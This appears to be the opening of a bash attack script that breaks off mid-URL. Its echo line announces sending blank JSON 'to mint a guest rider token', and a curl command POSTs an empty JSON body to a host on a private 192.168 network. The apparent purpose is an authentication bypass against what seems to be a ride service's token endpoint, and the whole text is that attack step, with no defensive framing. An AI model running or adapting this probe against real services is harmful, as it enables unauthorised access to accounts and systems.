#!/bin/bash
echo "[*] Sending blank JSON to mint a guest rider token..."
curl -i -X POST \
  -H "Content-Type: application/json" \
  -d '{}' \
  http://192.168.1
